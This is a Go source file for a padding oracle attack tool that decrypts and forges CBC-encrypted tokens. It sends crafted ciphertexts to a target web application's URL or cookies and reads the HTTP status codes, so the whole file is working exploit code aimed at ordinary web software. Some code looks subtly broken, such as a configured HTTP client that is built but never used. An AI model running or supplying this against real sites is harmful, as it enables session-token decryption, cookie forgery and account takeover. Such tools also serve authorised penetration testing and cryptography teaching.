package pax

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/avast/retry-go"
	"github.com/viki-org/dnscache"
)

var alphabet []byte

func init() {
	var i byte
	for i = 32; i < 127; i++ {
		alphabet = append(alphabet, i)
	}
	for i = 0; i < 32; i++ {
		alphabet = append(alphabet, i)
	}
	for i = 127; i != 0; i++ {
		alphabet = append(alphabet, i)
	}
}

type ExploitOptions struct {
	BlockSize int
	Method    string
	Cookies   string
	PlainText string
}

var defaultOptions = &ExploitOptions{
	BlockSize: 16,
	Method:    http.MethodGet,
}

func (options *ExploitOptions) inherit() {
	if options.Method == "" {
		options.Method = defaultOptions.Method
	}
	if options.BlockSize == 0 {
		options.BlockSize = defaultOptions.BlockSize
	}
}

func Decrypt(url string, sample string, options *ExploitOptions) ([]byte, error) {
	return newExploiter(url, sample, options).decrypt()
}

func Encrypt(url string, sample string, options *ExploitOptions) ([]byte, error) {
	return newExploiter(url, sample, options).encrypt()
}

type exploiter struct {
	client    *http.Client
	sample    string
	url       string
	blockSize int
	method    string
	cookies   string
	urlEncode bool
	plaintext string
}

func newExploiter(url, sample string, options *ExploitOptions) *exploiter {
	if options == nil {
		options = defaultOptions
	} else {
		options.inherit()
	}

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	resolver := dnscache.New(time.Minute * 5)

	client.Transport = &http.Transport{
		MaxIdleConnsPerHost: 64,
		DialContext: func(ctx context.Context, network string, address string) (net.Conn, error) {
			separator := strings.LastIndex(address, ":")
			ip, err := resolver.FetchOneString(address[:separator])
			if err != nil {
				return nil, err
			}
			return net.Dial("tcp", ip+address[separator:])
		},
	}

	return &exploiter{
		sample:    sample,
		url:       url,
		plaintext: options.PlainText,
		blockSize: options.BlockSize,
		method:    options.Method,
		cookies:   options.Cookies,
		client:    &http.Client{},
	}
}

func (x *exploiter) decrypt() ([]byte, error) {

	rawB64 := x.sample

	fmt.Println("Decoding sample...")

	if strings.Contains(x.sample, "%") {
		var err error
		rawB64, err = url.QueryUnescape(x.sample)
		if err != nil {
			return nil, err
		}
		x.urlEncode = true
	}

	sample, err := base64.StdEncoding.DecodeString(rawB64)
	if err != nil { // if this isn't valid base64, just take it as literal encrypted bytes
		return nil, err
	}

	fmt.Println("Checking sample...")

	if len(sample)%x.blockSize > 0 {
		return nil, fmt.Errorf("sample data is incorrect length for given blocksize")
	}

	fmt.Println("Trying oracle with sample data...")

	valid, err := x.try(sample)
	if err != nil {
		return nil, err
	}
	if !valid {
		return nil, fmt.Errorf("sample data does not appear to be valid")
	}

	blockCount := len(sample) / x.blockSize

	var plaintext []byte

	for blockIndex := 1; blockIndex < blockCount; blockIndex++ {

		fmt.Printf("Working on block %d of %d...\n", blockIndex, blockCount-1)

		targetBlock := sample[blockIndex*x.blockSize : (blockIndex+1)*x.blockSize]

		blockPlaintext := make([]byte, x.blockSize)
		/*
			C1 = sample

			P2[16] = C1[16] ^ I2[16]
			= C1[16] ^ 95
		*/

		intermediate, err := x.attackBlock(targetBlock)
		if err != nil {
			return nil, err
		}

		for i := 0; i < x.blockSize; i++ {
			blockPlaintext[i] = sample[((blockIndex-1)*x.blockSize)+i] ^ intermediate[i]
		}

		plaintext = append(plaintext, blockPlaintext...)
	}

	fmt.Println("Removing padding from solution...")

	return pkcs7Unpad(plaintext, x.blockSize)
}

func (x *exploiter) encrypt() ([]byte, error) {

	fmt.Println("Decoding sample...")

	if strings.Contains(x.sample, "%") {
		if _, err := url.QueryUnescape(x.sample); err != nil {
			return nil, err
		}
		x.urlEncode = true
	}

	plaintext, err := pkcs7Pad([]byte(x.plaintext), x.blockSize)
	if err != nil {
		return nil, err
	}

	blockCount := len(plaintext) / x.blockSize

	//panic(blockCount)

	blockOutput := make([]byte, x.blockSize)
	output := make([]byte, x.blockSize)

	for blockIndex := blockCount; blockIndex > 0; blockIndex-- {

		fmt.Printf("Working on block %d of %d...\n", blockIndex, blockCount)

		/*
			C1 = sample

			P2[16] = C1[16] ^ I2[16]
			= C1[16] ^ 95
		*/

		intermediate, err := x.attackBlock(blockOutput)
		if err != nil {
			return nil, err
		}

		for i := 0; i < x.blockSize; i++ {
			blockOutput[i] = plaintext[((blockIndex-1)*x.blockSize)+i] ^ intermediate[i]
		}

		output = append(blockOutput, output...)
	}

	b64 := base64.StdEncoding.EncodeToString(output)
	if x.urlEncode {
		return []byte(url.QueryEscape(b64)), nil
	}

	return []byte(b64), nil
}

func (x *exploiter) attackBlock(targetBlock []byte) ([]byte, error) {

	intermediate := make([]byte, x.blockSize)
	prefix := make([]byte, x.blockSize)
	crafted := append(prefix, targetBlock...)

	for byteIndex := x.blockSize - 1; byteIndex >= 0; byteIndex-- {

		// calculate values so that all N bytes after the one we're targeting equal N
		for p := x.blockSize - 1; p > byteIndex; p-- {

			padTarget := byte(x.blockSize - byteIndex)
			/*
					C'1[16] = P'2[16] ^ I2[16]
				        	= 02      ^ 95
				        	= 93
			*/
			crafted[p] = padTarget ^ intermediate[p]
		}

		var found bool
		for i := 0; i <= 0xff; i++ {

			crafted[byteIndex] = byte(i)

			valid, err := x.try(crafted)
			if err != nil {
				return nil, err
			}

			if valid {
				found = true
				break
			}
		}

		if !found {
			crafted[byteIndex] = 0
			return nil, fmt.Errorf("could not find bad padding")
		}

		/*

			C1' = crafted[0:16]
			P2' = ???????????????1
			P2  = ????????????????
			I2  = intermediate

			I2     = C1'     ^ P2'
			I2[16] = C1'[16] ^ P2'[16]
			       = 94      ^ 01
			       = 95

		*/

		intermediate[byteIndex] = crafted[byteIndex] ^ byte(x.blockSize-byteIndex)

	}

	return intermediate, nil

}

func clean(data []byte) string {
	var result string
	for _, b := range data {
		if b < 32 || b >= 127 {
			result += " "
		} else {
			result += string([]byte{b})
		}
	}
	return result
}

// returns true if payload is valid
func (x *exploiter) try(payload []byte) (bool, error) {

	encoded := base64.StdEncoding.EncodeToString(payload)

	fullURL := strings.ReplaceAll(x.url, x.sample, encoded)

	req, err := http.NewRequest(x.method, fullURL, nil)
	if err != nil {
		return false, err
	}

	if x.cookies != "" {
		cookies := strings.Split(x.cookies, ";")
		for _, cookie := range cookies {
			parts := strings.SplitN(cookie, "=", 2)
			if len(parts) == 2 {
				escaped := encoded
				if x.urlEncode {
					escaped = url.QueryEscape(escaped)
				}
				req.AddCookie(&http.Cookie{
					Name:   strings.TrimSpace(parts[0]),
					Value:  strings.ReplaceAll(strings.TrimSpace(parts[1]), x.sample, escaped),
					Path:   "/",
					Domain: req.Host,
				})
			}
		}
	}

	var statusCode int

	if err := retry.Do(func() error {
		response, err := x.client.Do(req)
		if err != nil {
			return fmt.Errorf("request to oracle failed with error: %s", err)
		}
		defer func() {
			io.Copy(ioutil.Discard, response.Body)
			response.Body.Close()
		}()
		if response.StatusCode == http.StatusBadGateway ||
			response.StatusCode == http.StatusGatewayTimeout ||
			response.StatusCode == http.StatusServiceUnavailable {
			return fmt.Errorf("request to oracle failed with HTTP status %d", response.StatusCode)
		}
		statusCode = response.StatusCode
		return nil
	}, retry.Attempts(5)); err != nil {
		return false, err
	}

	if statusCode > 399 {
		return false, nil
	}

	return true, nil
}
